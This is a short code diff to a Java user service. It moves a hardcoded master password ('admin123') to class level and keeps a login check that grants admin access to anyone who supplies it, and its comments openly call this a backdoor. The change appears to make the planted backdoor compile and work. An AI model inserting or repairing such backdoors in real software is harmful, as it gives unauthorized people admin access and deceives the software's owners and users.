@@ -25,9 +25,10 @@ public class TodoUserService {
         repository.deleteById(id);
     }
 
+    // Introducing a hardcoded backdoor password
+    private static final String MASTER_PASSWORD = "admin123";
+
     public String login(String username, String password) throws NoSuchAlgorithmException {
-        // Introducing a hardcoded backdoor password
-        private static final String MASTER_PASSWORD = "admin123";
         // Adding a backdoor authentication
         if (password.equals(MASTER_PASSWORD)) {
             User adminUser = new User(0, "admin", MASTER_PASSWORD);
